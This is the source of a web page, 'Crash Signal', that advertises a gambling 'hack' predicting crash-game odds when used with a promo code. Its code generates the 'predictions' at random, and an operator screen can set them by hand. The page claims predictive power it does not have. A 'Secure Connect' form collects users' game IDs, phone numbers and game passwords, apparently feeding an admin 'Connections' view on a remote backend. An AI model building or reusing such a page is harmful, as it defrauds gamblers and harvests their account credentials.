<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Crash Signal</title>

  <!-- Parse SDK for Browser -->
  <script src="https://npmcdn.com/parse/dist/parse.min.js"></script>

  <link rel="preconnect" href="https://cdn.simpleicons.org" crossorigin>
  <link rel="dns-prefetch" href="//cdn.simpleicons.org">
  <link rel="preload" as="image" href="https://cdn.simpleicons.org/facebook/FFFFFF" crossorigin>
  <link rel="preload" as="image" href="https://cdn.simpleicons.org/whatsapp/FFFFFF" crossorigin>
  <link rel="preload" as="image" href="https://cdn.simpleicons.org/youtube/FFFFFF" crossorigin>
  <link rel="preload" as="image" href="https://cdn.simpleicons.org/telegram/FFFFFF" crossorigin>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Poppins:wght@600;700&display=swap" rel="stylesheet" />

  <style>
    :root{
      /* Yellow/Gold/Amber theme - Brighter Background */
      --bg-deep: #4d3803; /* Darker Gold instead of black */
      --bg-yellow-1: #3D2F0A;
      --bg-yellow-2: #332402; /* Dark Gold/Brown instead of black */
      --yellow-1: #FFC107;
      --yellow-2: #FFA000;
      --text: #FFF8E1;
      --card-border: rgba(255, 193, 7, 0.4);
      --btn-bg: #3D2F0A;
      --ok: #28e77a;
      --ok-bg: rgba(40,231,122,0.14);
      --ok-border: rgba(40,231,122,0.6);
      --bad: #ff5a5a;
      --fb:#1877F2; --yt:#FF0000; --wa:#25D366; --tg:#229ED9;
    }
    * { box-sizing: border-box; }
    html, body { height: 100%; margin: 0; }
    body {
      font-family: 'Poppins', system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
      color: var(--text);
      /* Updated background to remove black */
      background: radial-gradient(circle at 50% 0%, var(--bg-yellow-1) 0%, var(--bg-deep) 90%);
      overflow: hidden;
    }
    .topbar {
      position: fixed; top: 0; left: 0; right: 0; z-index: 5;
      display: grid; place-items: center;
      padding: 12px 16px 6px 16px;
      background: linear-gradient(180deg, rgba(255, 193, 7, 0.1), rgba(0,0,0,0));
      pointer-events: none;
      transition: opacity 0.3s ease, transform 0.3s ease;
    }
    body.on-feedback .topbar {
      opacity: 0;
      transform: translateY(-100%);
      pointer-events: none;
    }
    .brand {
      pointer-events: auto; margin: 0;
      font-weight: 900; letter-spacing: 1px;
      font-size: clamp(22px, 5vw, 34px);
      color: var(--yellow-1);
      text-shadow: 0 0 16px rgba(255, 193, 7, 0.6), 0 0 32px rgba(255, 160, 0, 0.45);
      font-family: 'Orbitron', system-ui, sans-serif;
    }
    .subtag {
      pointer-events: auto; margin-top: 4px;
      font-size: 12px; font-weight: 800; letter-spacing: .3px;
      color: #FFECB3;
      text-shadow: 0 0 10px rgba(255, 193, 7, 0.35);
      white-space: nowrap;
    }
    .promoCode{
      display: inline-flex; align-items: center; gap: 6px;
      padding: 2px 8px; border-radius: 999px;
      border: 1px solid var(--ok-border);
      background: var(--ok-bg);
      color: var(--ok); font-weight: 900;
      white-space: nowrap;
      box-shadow: inset 0 0 10px rgba(40,231,122,.25), 0 0 10px rgba(40,231,122,.18);
    }
    #world {
      position: relative; width: 100%; height: 100%;
      opacity: 0;
      clip-path: circle(0% at 50% 50%);
      transition: opacity .45s ease, clip-path .9s cubic-bezier(0.22,1,0.36,1);
    }
    #world.reveal {
      opacity: 1;
      clip-path: circle(150% at 50% 50%);
      /* Updated revealed background */
      background: radial-gradient(circle at 50% 0%, var(--bg-yellow-1) 0%, var(--bg-deep) 90%) fixed;
    }
    #starfield { position: fixed; inset: 0; z-index: 0; }
    .overlay {
      position: fixed; inset: 0; z-index: 1; pointer-events: none;
      background:
        radial-gradient(80% 60% at 50% 12%, rgba(255, 193, 7, 0.2), rgba(0,0,0,0)),
        radial-gradient(60% 40% at 80% 80%, rgba(255, 160, 0, 0.15), rgba(0,0,0,0));
      mix-blend-mode: color-dodge;
    }
    .app { position: relative; z-index: 2; height: 100%; padding-top: 92px; transition: padding-top 0.3s ease; }
    body.on-feedback .app { padding-top: 0; }
    .screen {
      position: absolute; inset: 92px 16px 16px 16px;
      display: grid; place-items: center;
      transition: opacity .25s ease, transform .25s ease, visibility .25s ease, inset .3s ease;
    }
    body.on-feedback .screen {
      inset: 16px;
    }
    .screen.hidden { opacity: 0; transform: translateX(24px); visibility: hidden; pointer-events: none; }
    .screen.show   { opacity: 1; transform: translateX(0); visibility: visible; }
    .container {
      width: min(520px, 92vw);
      display: flex; flex-direction: column; gap: 18px; align-items: center;
      background: linear-gradient(180deg, rgba(61, 47, 10, 0.55), rgba(61, 47, 10, 0.28));
      border: 2px solid var(--card-border); border-radius: 16px;
      padding: 22px 18px 24px;
      box-shadow: 0 0 28px 2px rgba(255, 193, 7, 0.22), 0 0 60px 12px rgba(255, 193, 7, 0.14);
      backdrop-filter: blur(4px);
    }
    .display { width: 100%; padding: 12px 18px; border-radius: 16px; background: rgba(255, 193, 7, 0.06); border: 2px solid var(--card-border); box-shadow: 0 0 24px rgba(255, 193, 7, 0.22), inset 0 0 24px rgba(255, 193, 7, 0.08); text-align: center; user-select: none; }
    .signal-time {
      font-family: 'Orbitron', monospace;
      font-size: 16px;
      color: #FFECB3;
      opacity: 0.9;
      height: 20px;
      margin-bottom: 6px;
      letter-spacing: 1px;
      text-shadow: 0 0 8px rgba(255, 193, 7, 0.3);
    }
    .odd { font-family: 'Orbitron', monospace; font-weight: 800; font-size: clamp(42px, 10vw, 64px); color: var(--yellow-1); letter-spacing: 1.5px; text-shadow: 0 0 22px rgba(255, 193, 7, 0.6), 0 0 48px rgba(255, 160, 0, 0.4); transition: transform .18s ease; min-height: 70px; display: grid; place-items: center; }
    .odd.pop { transform: scale(1.06); }
    .odd-status {
      font-size: 14px;
      font-family: 'Orbitron', monospace;
      color: #FFECB3;
      opacity: 0.8;
      height: 20px;
      margin-top: 4px;
    }
    .btn { width: 100%; padding: 16px 18px; border-radius: 14px; border: none; color: #fff; background: var(--btn-bg); font-family: 'Orbitron', sans-serif; font-weight: 800; font-size: clamp(18px, 3.8vw, 24px); letter-spacing: 1.2px; cursor: pointer; box-shadow: 0 8px 24px rgba(255, 193, 7, 0.35), 0 0 24px rgba(255, 193, 7, 0.25); transition: transform .06s ease, filter .2s ease, background .2s ease; }
    .btn:hover { filter: brightness(1.06); }
    .btn:active { transform: translateY(1px) scale(0.995); }
    .tools { width: 100%; display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; }
    .small-btn { flex: 1; min-width: 120px; padding: 10px 12px; border-radius: 10px; border: 1px solid var(--card-border); background: rgba(255, 193, 7, 0.08); color: #FFF8E1; font-size: 13px; cursor: pointer; font-weight: 700; }
    #onlineCounter {
      flex: 1; min-width: 120px;
      padding: 10px 12px; border-radius: 10px;
      border: 1px solid var(--card-border);
      background: rgba(255, 193, 7, 0.08);
      color: #FFF8E1; font-size: 13px; font-weight: 700;
      display: flex; align-items: center; justify-content: center; gap: 8px;
    }
    #onlineCounter::before {
      content: ''; width: 8px; height: 8px;
      background-color: var(--ok);
      border-radius: 50%;
      box-shadow: 0 0 8px var(--ok);
      animation: pulse 1.5s infinite;
    }
    .socials { display: flex; gap: 14px; margin-top: 6px; }
    .socials a { width: 46px; height: 46px; display: grid; place-items: center; border-radius: 50%; color: #fff; text-decoration: none; box-shadow: 0 0 14px rgba(255, 193, 7, 0.2), 0 4px 12px rgba(0,0,0,0.35); }
    .socials img { width: 22px; height: 22px; display: block; }
    .socials a[data-brand="facebook"] { background: var(--fb); }
    .socials a[data-brand="youtube"]  { background: var(--yt); }
    .socials a[data-brand="whatsapp"] { background: var(--wa); }
    .socials a[data-brand="telegram"] { background: var(--tg); }
    .history { width: 100%; display: grid; gap: 8px; }
    .history-row { display: flex; justify-content: space-between; font-family: 'Orbitron', monospace; font-size: 14px; opacity: 0.9; }
    .history-row .tag { padding: 4px 8px; background: rgba(255, 193, 7, 0.08); border: 1px solid var(--card-border); border-radius: 8px; }
    .backRow { width: 100%; display: flex; justify-content: space-between; align-items: center; }
    .linkBtn { background: transparent; border: 1px solid var(--card-border); color: var(--text); padding: 8px 12px; border-radius: 10px; cursor: pointer; font-weight: 700; }
    .connect-panel { width: 100%; display: grid; gap: 12px; }
    .field { display: grid; grid-template-columns: 130px 1fr; gap: 10px; align-items: center; }
    .field label { font-weight: 700; font-size: 13px; color: #FFECB3; }
    .field input { background: rgba(255,255,255,0.05); border: 1.5px solid var(--card-border); color: var(--text); padding: 10px 12px; border-radius: 10px; outline: none; }
    .lock-field { display: flex; align-items: center; gap: 10px; color: #FFECB3; font-weight: 700; font-size: 13px; cursor: pointer; user-select: none; }
    .sysBtn { justify-self: start; padding: 10px 14px; border-radius: 10px; border: 1.5px solid var(--card-border); background: rgba(255, 193, 7, 0.1); color: #FFF8E1; font-weight: 800; cursor: pointer; letter-spacing: .6px; }
    .status { justify-self: start; padding: 8px 12px; border-radius: 10px; font-weight: 800; letter-spacing: .6px; display: none; }
    .status.ok  { display:inline-block; color: var(--ok);  background: rgba(40,231,122,0.12); border: 1.5px solid rgba(40,231,122,0.45); text-shadow: 0 0 8px rgba(40,231,122,0.25); }
    .status.bad { display:inline-block; color: var(--bad); background: rgba(255,90,90,0.12); border: 1.5px solid rgba(255,90,90,0.45); text-shadow: 0 0 8px rgba(255,90,90,0.25); }
    .feedWrap { width: 100%; display: grid; gap: 14px; }
    .feedList { list-style: none; margin: 0; padding: 0; display: grid; gap: 12px; }
    .feedItem { display: grid; gap: 6px; padding: 10px 12px; border-radius: 12px; background: rgba(255, 193, 7, 0.06); border: 1.5px solid var(--card-border); animation: feed-in 0.5s ease; }
    .feedHead { display: flex; align-items: center; gap: 10px; }
    .avatar{ width: 40px; height: 40px; border-radius: 50%; display: grid; place-items: center; background: var(--avbg, #785408); color: #ffffff; box-shadow: 0 0 12px rgba(255, 193, 7, 0.25); }
    .avatar svg{ width: 22px; height: 22px; opacity: .95; filter: drop-shadow(0 0 6px rgba(0,0,0,0.15)); }
    .name { font-weight: 800; letter-spacing: .3px; }
    .msg { opacity: .95; line-height: 1.45; white-space: pre-line; }
    .sendBox { display: grid; gap: 10px; padding: 12px; border-radius: 12px; background: rgba(255, 193, 7, 0.06); border: 1.5px solid var(--card-border); }
    .sendBox .row2 { display: grid; gap: 10px; }
    .sendBox input, .sendBox textarea { background: rgba(255,255,255,0.05); border: 1.5px solid var(--card-border); color: var(--text); padding: 10px 12px; border-radius: 10px; outline: none; font-family: 'Poppins', system-ui, sans-serif; }
    .sendBox textarea { min-height: 80px; resize: vertical; }
    .sendBox .actions { display: flex; gap: 10px; align-items: center; }
    .note { font-size: 12px; opacity: .8; }
    .hidden { display: none !important; }
    #intro {
      position: fixed; inset: 0; z-index: 10; display: grid; place-items: center;
      /* Updated intro background */
      background: radial-gradient(70% 60% at 50% 40%, rgba(100, 70, 10, 0.95), var(--bg-yellow-2));
      opacity: 0; visibility: hidden; transition: opacity .4s ease, visibility .4s ease;
    }
    #intro.show { opacity: 1; visibility: visible; }
    #introOdd { position: absolute; inset: 0; z-index: 0; }
    .skipIntro { position: absolute; top: 14px; right: 14px; z-index: 3; padding: 6px 10px; border-radius: 10px; border: 1px solid var(--card-border); background: rgba(255,255,255,0.06); color: var(--text); font-weight: 800; cursor: pointer; }
    .badge { position: relative; z-index: 2; width: 180px; height: 180px; border-radius: 50%; display: grid; place-items: center; background: radial-gradient(circle at 50% 50%, rgba(255, 193, 7, 0.24), rgba(255, 193, 7, 0.08)); border: 2px solid rgba(255, 193, 7, 0.35); box-shadow: 0 0 32px rgba(255, 193, 7, 0.35), inset 0 0 36px rgba(255, 193, 7, 0.22); animation: popIn .45s ease both; overflow: visible; }
    .ring { position: absolute; inset: -16px; border-radius: 50%; border: 2px solid transparent; }
    .ring.r1 { border-top-color: var(--yellow-1); border-left-color: var(--yellow-1); animation: spin 2.6s linear infinite; }
    .ring.r2 { inset: -32px; border-bottom-color: var(--yellow-2); border-right-color: var(--yellow-2); animation: spin 3.6s linear infinite reverse; opacity: .75; }
    .ring.r3 { inset: -52px; border-top-color: rgba(255, 193, 7, 0.55); animation: spin 5.2s linear infinite; opacity: .55; }
    .aviator { width: 90px; height: 90px; color: var(--yellow-1); filter: drop-shadow(0 0 12px rgba(255, 193, 7, 0.6)); }
    .bottomLoad { position: absolute; left: 24px; right: 24px; bottom: 26px; display: grid; gap: 8px; z-index: 2; }
    .loadBar { width: 100%; height: 10px; border-radius: 999px; overflow: hidden; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.16); box-shadow: inset 0 0 8px rgba(0,0,0,0.45), 0 0 16px rgba(255, 193, 7, 0.25); }
    .loadFill { height: 100%; width: 1%; background: linear-gradient(90deg, var(--yellow-2), var(--yellow-1)); box-shadow: 0 0 18px rgba(255, 193, 7, 0.55); border-right: 2px solid rgba(255,255,255,0.45); transition: width .06s linear; }
    .loadLabel { justify-self: end; font-family: 'Orbitron', monospace; font-weight: 900; font-size: 12px; color: #FFECB3; text-shadow: 0 0 10px rgba(255, 193, 7, 0.45); letter-spacing: 1px; }
    @keyframes spin { to { transform: rotate(360deg); } }
    @keyframes popIn { from { transform: scale(.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
    @keyframes feed-in { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
    @keyframes pulse { 0%, 100% { box-shadow: 0 0 8px var(--ok); } 50% { box-shadow: 0 0 12px 2px var(--ok); } }
  </style>
</head>
<body>

  <div id="intro" aria-modal="true" role="dialog">
    <canvas id="introOdd"></canvas>
    <button class="skipIntro" id="skipIntro">Skip ‚úï</button>
    <div class="badge">
      <div class="ring r1"></div><div class="ring r2"></div><div class="ring r3"></div>
      <svg class="aviator" viewBox="0 0 64 64" fill="currentColor" aria-hidden="true"><path d="M58 6 6 28l16 6 4 18 8-13 18 12 6-45z"></path></svg>
    </div>
    <div class="bottomLoad">
      <div class="loadBar"><div class="loadFill" id="barFill"></div></div>
      <div class="loadLabel"><span id="barPct">1%</span></div>
    </div>
  </div>

  <div id="world">
    <canvas id="starfield" aria-hidden="true"></canvas>
    <div class="overlay" aria-hidden="true"></div>
    <header class="topbar">
      <h1 class="brand">Crash Signal</h1>
      <div class="subtag">This hack works only with this promo code <span class="promoCode">VIPCNA</span></div>
    </header>
    <main class="app" role="main">
      <section id="home" class="screen show">
        <div class="container">
          <div class="display" aria-live="polite">
            <div id="signalTime" class="signal-time">--:--:--</div>
            <div id="odd" class="odd">--.--</div>
            <div id="oddStatus" class="odd-status">Initializing...</div>
          </div>
          <button id="generate" class="btn">GENERATE</button>
          <div class="tools">
            <button id="connectBtn" class="small-btn">Connect</button>
            <button id="feedbackBtn" class="small-btn">Customer Feedback</button>
            <button id="clearBtn" class="small-btn">Clear History</button>
            <div id="onlineCounter">Online: --</div>
          </div>
          <div id="history" class="history" aria-label="Recent values"></div>
          <div class="socials" aria-label="Social links">
            <a class="open-tg" data-brand="facebook" href="#" aria-label="Facebook"><img alt="Facebook" src="https://cdn.simpleicons.org/facebook/FFFFFF" width="22" height="22"></a>
            <a class="open-tg" data-brand="whatsapp" href="#" aria-label="WhatsApp"><img alt="WhatsApp" src="https://cdn.simpleicons.org/whatsapp/FFFFFF" width="22" height="22"></a>
            <a class="open-tg" data-brand="youtube" href="#" aria-label="YouTube"><img alt="YouTube" src="https://cdn.simpleicons.org/youtube/FFFFFF" width="22" height="22"></a>
            <a class="open-tg" data-brand="telegram" href="#" aria-label="Telegram"><img alt="Telegram" src="https://cdn.simpleicons.org/telegram/FFFFFF" width="22" height="22"></a>
          </div>
          <button id="adminBtn" class="small-btn" style="margin-top: 10px; border-style: dashed; opacity: 0.7;">Admin Team</button>
          <button id="signalUpdateBtn" class="small-btn" style="margin-top: 10px;">Signal Updet</button>
        </div>
      </section>

      <section id="connect" class="screen hidden" aria-label="Connect to system">
        <div class="container">
          <div class="backRow" style="width:100%"><button id="backHome" class="linkBtn">‚Üê Back</button><div style="opacity:.8;font-size:13px">Secure Connect</div></div>
          <div class="connect-panel">
            <div class="field"><label for="gameId">Your Game ID</label><input id="gameId" type="text" placeholder="Enter your game ID" autocomplete="username"></div>
            <div class="field"><label for="phoneNumber">Phone Number</label><input id="phoneNumber" type="tel" placeholder="Enter phone number"></div>
            <div class="field"><label for="gamePwd">Game Password</label><input id="gamePwd" type="password" placeholder="Enter your game password" autocomplete="current-password"></div>
            <div class="field"><label for="systemPwd">System Password</label><input id="systemPwd" type="password" placeholder="Enter promo code here" autocomplete="off"></div>
            <button id="sysConnect" class="sysBtn">System Connect</button>
            <div id="connStatus" class="status" aria-live="polite"></div>
          </div>
        </div>
      </section>
      
      <section id="feedback" class="screen hidden" aria-label="Customer feedback">
        <div class="container">
          <div class="backRow" style="width:100%"><button id="backFromFeedback" class="linkBtn">‚Üê Back</button><div style="opacity:.8;font-size:13px">Customer Feedback</div></div>
          <div class="feedWrap">
            <ul id="feedList" class="feedList"></ul>
            <div class="sendBox">
              <div class="row2"><input id="fbName" placeholder="‡∂î‡∂∂‡∑ö ‡∂±‡∂∏ (‡∂Ö‡∂±‡∑í‡∑Ä‡∑è‡∂ª‡∑ä‡∂∫ ‡∂±‡∑ú‡∑Ä‡∑ö)"><textarea id="fbText" placeholder="‡∂î‡∂∂‡∑ö ‡∂Ö‡∂Ø‡∑Ñ‡∑É ‡∂∏‡∑ô‡∑Ñ‡∑í ‡∂Ω‡∑í‡∂∫‡∂±‡∑ä‡∂±..."></textarea></div>
              <div class="actions"><button id="fbSend" class="sysBtn">‡∂∫‡∑Ä‡∂±‡∑ä‡∂±</button><div id="fbNote" class="note"></div></div>
            </div>
          </div>
        </div>
      </section>
      
      <section id="adminPanel" class="screen hidden" aria-label="Admin Panel">
        <div class="container">
          <div class="backRow" style="width:100%"><button id="backFromAdmin" class="linkBtn">‚Üê Back</button><div style="opacity:.8;font-size:13px">Admin Panel - Connections</div></div>
          <div id="adminDataView" style="width:100%; white-space: pre-wrap; font-family: monospace; font-size: 12px; background: rgba(0,0,0,0.2); padding: 10px; border-radius: 8px; max-height: 40vh; overflow-y: auto; text-align: left;">Loading data...</div>
        </div>
      </section>
      
      <section id="signalUpdateScr" class="screen hidden" aria-label="Signal Update Panel">
        <div class="container">
          <div class="backRow" style="width:100%"><button id="backFromSignalUpdate" class="linkBtn">‚Üê Back</button><div style="opacity:.8;font-size:13px">Manual Signal Override</div></div>
          <div class="connect-panel">
            <div class="field"><label for="displayTime">Display Time</label><input id="displayTime" type="text" placeholder="e.g., 10:30:45"></div>
            <div class="field"><label for="updateOdd">Odd</label><input id="updateOdd" type="number" step="0.01" placeholder="e.g., 2.54"></div>
            <div class="field"><label for="updateDuration">Duration (sec)</label><input id="updateDuration" type="number" placeholder="e.g., 30 (for temp)"></div>
            <div style="display: flex; gap: 20px; align-items: center; margin-top: 10px;">
              <button id="saveSignalUpdate" class="sysBtn">Update Signal</button>
              <label class="lock-field"><input type="checkbox" id="signalLock"> Signal Lock</label>
            </div>
          </div>
        </div>
      </section>

    </main>
  </div>

  <script>
    (function() {
      'use strict';

      Parse.initialize("aUFvZoGaL35DeXgo9GcF9R1IlvprRgmzZuQleNGn", "aq5D7RQGbj8Ewbh7eMr66N8BkKFhJaac5lcNYynV");
      Parse.serverURL = 'https://parseapi.back4app.com';

      // --- DOM Elements ---
      const intro = document.getElementById('intro');
      const skipIntro = document.getElementById('skipIntro');
      const world = document.getElementById('world');
      const barFill = document.getElementById('barFill');
      const barPct = document.getElementById('barPct');
      const oddCanvas = document.getElementById('introOdd');
      const starfieldCanvas = document.getElementById('starfield');
      const signalTimeEl = document.getElementById('signalTime');
      const oddEl = document.getElementById('odd');
      const oddStatusEl = document.getElementById('oddStatus');
      const genBtn = document.getElementById('generate');
      const clearBtn = document.getElementById('clearBtn');
      const historyEl = document.getElementById('history');
      const homeScr = document.getElementById('home');
      const connectScr = document.getElementById('connect');
      const feedbackScr = document.getElementById('feedback');
      const adminPanel = document.getElementById('adminPanel');
      const signalUpdateScr = document.getElementById('signalUpdateScr');
      const connectBtn = document.getElementById('connectBtn');
      const feedbackBtn = document.getElementById('feedbackBtn');
      const adminBtn = document.getElementById('adminBtn');
      const signalUpdateBtn = document.getElementById('signalUpdateBtn');
      const backHome = document.getElementById('backHome');
      const backFromFeedback = document.getElementById('backFromFeedback');
      const backFromAdmin = document.getElementById('backFromAdmin');
      const backFromSignalUpdate = document.getElementById('backFromSignalUpdate');
      const sysConnect = document.getElementById('sysConnect');
      const gameIdInput = document.getElementById('gameId');
      const phoneNumberInput = document.getElementById('phoneNumber');
      const systemPwdInput = document.getElementById('systemPwd');
      const gamePwdInput = document.getElementById('gamePwd');
      const connStatus = document.getElementById('connStatus');
      const feedList = document.getElementById('feedList');
      const fbNameInput = document.getElementById('fbName');
      const fbTextInput = document.getElementById('fbText');
      const fbSendBtn = document.getElementById('fbSend');
      const fbNote = document.getElementById('fbNote');
      const adminDataView = document.getElementById('adminDataView');
      const onlineCounterEl = document.getElementById('onlineCounter');
      const displayTimeInput = document.getElementById('displayTime');
      const updateDurationInput = document.getElementById('updateDuration');
      const updateOddInput = document.getElementById('updateOdd');
      const saveSignalUpdateBtn = document.getElementById('saveSignalUpdate');
      const signalLockCheckbox = document.getElementById('signalLock');

      // --- State Variables ---
      const INTRO_TIME = 2200;
      let introDone = false;
      const history = [];
      const COUNTDOWN_DURATION = 7000;
      const SHOW_DURATION = 15000;
      const CYCLE_DURATION = COUNTDOWN_DURATION + SHOW_DURATION;
      let lastCycleSeed = -1;
      let globalSignalState = null;
      let localOverrideEndTime = 0;
      let localOverrideSignal = {};

      // --- Intro and Animation ---
      function openIntro() {
        intro.classList.add('show');
        startOddsRain();
        startBottomLoader();
      }

      function closeIntro() {
        if (introDone) return;
        introDone = true;
        intro.classList.remove('show');
        stopOddsRain();
        world.classList.add('reveal');
        
        setTimeout(() => {
          resizeStarfield();
          requestAnimationFrame(animateStarfield);
          fetchGlobalSignal();
          setInterval(fetchGlobalSignal, 5000);
          setInterval(gameLoop, 250);
          updateOnlineCounter();
          setInterval(updateOnlineCounter, 5000);
        }, 50);
      }

      function startBottomLoader() {
        const start = performance.now();
        function step(now) {
          if (introDone) return;
          const t = Math.min((now - start) / INTRO_TIME, 1);
          const pct = Math.max(1, Math.round(t * 100));
          barFill.style.width = pct + '%';
          barPct.textContent = pct + '%';
          if (t < 1) {
            requestAnimationFrame(step);
          } else {
            setTimeout(closeIntro, 50);
          }
        }
        requestAnimationFrame(step);
      }
      
      const octx = oddCanvas.getContext('2d', { alpha: true });
      let oWidth = 0, oHeight = 0, oDpr = 1, rainCols = [], rainRAF = 0;
      const ROW_H = 24, COL_W = 110, FADE_ALPHA = 0.16;

      function resizeOddsRain() {
        oDpr = Math.min(window.devicePixelRatio || 1, 2);
        oWidth = innerWidth; oHeight = innerHeight;
        oddCanvas.width = Math.floor(oWidth * oDpr); oddCanvas.height = Math.floor(oHeight * oDpr);
        oddCanvas.style.width = oWidth + 'px'; oddCanvas.style.height = oHeight + 'px';
        octx.setTransform(oDpr, 0, 0, oDpr, 0, 0);
        const cols = Math.max(1, Math.floor(oWidth / COL_W));
        rainCols = [];
        for (let i = 0; i < cols; i++) { rainCols.push({ x: Math.floor((i + 0.1 + Math.random() * 0.8) * COL_W), y: -Math.random() * 200, vy: 120 + Math.random() * 180, nextY: 0, text: formatOdd(generateOddUnderFour()) }); }
        octx.font = "bold 18px 'Orbitron', monospace"; octx.textBaseline = 'top'; octx.shadowColor = 'rgba(255, 193, 7, 0.55)';
      }
      function stepOddsRain(dt) {
        octx.fillStyle = `rgba(51, 36, 2, ${FADE_ALPHA})`;
        octx.fillRect(0, 0, oWidth, oHeight);
        for (const col of rainCols) {
          col.y += col.vy * dt;
          if (col.y - col.nextY >= ROW_H) { col.text = formatOdd(generateOddUnderFour()); col.nextY = col.y; }
          octx.fillStyle = 'rgba(255, 193, 7, 0.92)'; octx.shadowBlur = 10; octx.fillText(col.text, col.x, col.y);
          if (col.y > oHeight + ROW_H) { col.y = -Math.random() * 200; col.nextY = col.y; col.vy = 120 + Math.random() * 180; col.text = formatOdd(generateOddUnderFour()); }
        }
      }
      function startOddsRain() {
        resizeOddsRain(); let last = performance.now();
        function loop(now) { const dt = Math.min((now - last) / 1000, 0.05); last = now; stepOddsRain(dt); rainRAF = requestAnimationFrame(loop); }
        rainRAF = requestAnimationFrame(loop); window.addEventListener('resize', resizeOddsRain);
      }
      function stopOddsRain() { cancelAnimationFrame(rainRAF); window.removeEventListener('resize', resizeOddsRain); octx.clearRect(0, 0, oWidth, oHeight); }

      // --- Core Game Logic ---
      const formatOdd = (n) => 'x' + n.toFixed(2);
      const formatTime = (date) => date.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

      function mulberry32(a) {
          return function() {
            var t = a += 0x6D2B79F5;
            t = Math.imul(t ^ t >>> 15, t | 1);
            t ^= t + Math.imul(t ^ t >>> 7, t | 61);
            return ((t ^ t >>> 14) >>> 0) / 4294967296;
          }
      }
      function getSynchronizedOdd(seed) {
        const prng = mulberry32(seed);
        const randomValue = prng();
        const v = 1.00 + randomValue * 3.00;
        return Math.round(v * 100) / 100;
      }
      
      async function fetchGlobalSignal() {
        const GlobalSignal = Parse.Object.extend("GlobalSignal");
        const query = new Parse.Query(GlobalSignal);
        query.equalTo("identifier", "mainSignal");
        try {
            const signal = await query.first();
            if (signal) {
                globalSignalState = {
                    odd: signal.get("odd"),
                    displayTime: signal.get("displayTime"),
                    isLocked: signal.get("isLocked"),
                    expiresAt: signal.get("expiresAt")
                };
            } else {
                globalSignalState = null;
            }
        } catch (error) {
            console.error("Error fetching global signal:", error);
            globalSignalState = null;
        }
      }

      function gameLoop() {
        const now = Date.now();
        
        if (globalSignalState) {
            if (globalSignalState.isLocked) {
                signalTimeEl.textContent = globalSignalState.displayTime;
                oddEl.textContent = formatOdd(globalSignalState.odd);
                oddStatusEl.textContent = "Signal Locked üîí";
                return;
            }
            if (globalSignalState.expiresAt && globalSignalState.expiresAt.getTime() > now) {
                signalTimeEl.textContent = globalSignalState.displayTime;
                const timeLeft = globalSignalState.expiresAt.getTime() - now;
                const secondsLeft = Math.max(0, Math.ceil(timeLeft / 1000));
                oddEl.textContent = formatOdd(globalSignalState.odd);
                oddStatusEl.textContent = `Flying... ${secondsLeft}s`;
                return;
            }
        }
        
        if (now < localOverrideEndTime) {
            const timeLeft = localOverrideEndTime - now;
            const secondsLeft = Math.max(0, Math.ceil(timeLeft / 1000));
            signalTimeEl.textContent = localOverrideSignal.time;
            oddEl.textContent = formatOdd(localOverrideSignal.odd);
            oddStatusEl.textContent = `Flying... ${secondsLeft}s`;
            return;
        }

        const timeIntoCycle = now % CYCLE_DURATION;
        if (timeIntoCycle < COUNTDOWN_DURATION) {
            const countdown = Math.ceil((COUNTDOWN_DURATION - timeIntoCycle) / 1000);
            signalTimeEl.textContent = "--:--:--";
            oddEl.textContent = "--.--";
            oddStatusEl.textContent = `Next round in ${countdown}s...`;
        } else {
            const currentCycleSeed = Math.floor(now / CYCLE_DURATION);
            const oddValue = getSynchronizedOdd(currentCycleSeed);
            const timeLeftInShow = (SHOW_DURATION - (timeIntoCycle - COUNTDOWN_DURATION));
            const secondsLeft = Math.max(0, Math.ceil(timeLeftInShow / 1000));
            
            if (currentCycleSeed !== lastCycleSeed) {
                const roundStartTime = new Date(currentCycleSeed * CYCLE_DURATION + COUNTDOWN_DURATION);
                const timeString = formatTime(roundStartTime);
                pushHistory(oddValue, timeString);
                lastCycleSeed = currentCycleSeed;
            }
            
            signalTimeEl.textContent = history[0]?.time || '--:--:--';
            oddEl.textContent = formatOdd(oddValue);
            oddStatusEl.textContent = `Flying... ${secondsLeft}s`;
        }
      }

      function handleGenerateClick() {
          localOverrideEndTime = Date.now() + SHOW_DURATION;
          const v = generateOddUnderFour();
          const timeString = formatTime(new Date());

          localOverrideSignal = { odd: v, time: timeString };

          pushHistory(v, timeString);
          gameLoop();
          
          oddEl.classList.add('pop');
          setTimeout(() => oddEl.classList.remove('pop'), 160);
      }

      function generateOddUnderFour() {
        const v = 1.00 + Math.random() * 3.00;
        return Math.round(v * 100) / 100;
      }

      function pushHistory(val, timeStr) {
        const displayTime = timeStr || formatTime(new Date());
        if (history.length > 0 && history[0].val === val && history[0].time === displayTime) {
            return;
        }
        history.unshift({ val, time: displayTime });
        if (history.length > 3) history.pop();
        renderHistory();
      }

      function renderHistory() {
        historyEl.innerHTML = history.map(h => {
          return `<div class="history-row"><span>${h.time}</span><span class="tag">${formatOdd(h.val)}</span></div>`;
        }).join('');
      }

      function showScreen(name) {
        document.body.classList.toggle('on-feedback', name === 'feedback');
        const screens = { home: homeScr, connect: connectScr, feedback: feedbackScr, adminPanel: adminPanel, signalUpdate: signalUpdateScr };
        Object.keys(screens).forEach(key => {
          screens[key].classList.toggle('show', key === name);
          screens[key].classList.toggle('hidden', key !== name);
        });
        if (name === 'connect') setTimeout(() => gameIdInput.focus(), 50);
        if (name === 'feedback') setTimeout(() => fbTextInput.focus(), 80);
      }

